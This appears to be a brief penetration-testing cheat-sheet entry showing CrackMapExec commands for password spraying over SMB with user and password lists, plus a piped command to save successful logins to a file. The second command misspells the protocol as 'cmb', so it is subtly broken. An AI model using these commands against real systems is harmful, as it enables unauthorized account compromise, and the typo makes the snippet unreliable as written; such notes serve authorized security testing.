# CrackMapExec

## Password Spraying

`crackmapexec smb targets.txt -u users.txt -p passwords.txt`
Can also store into a "found_accounts.txt" file for all accounts where a password is found.
`crackmapexec cmb targets.txt -u users.txt -p passwords.txt | grep '[+]' > found_accounts.txt`

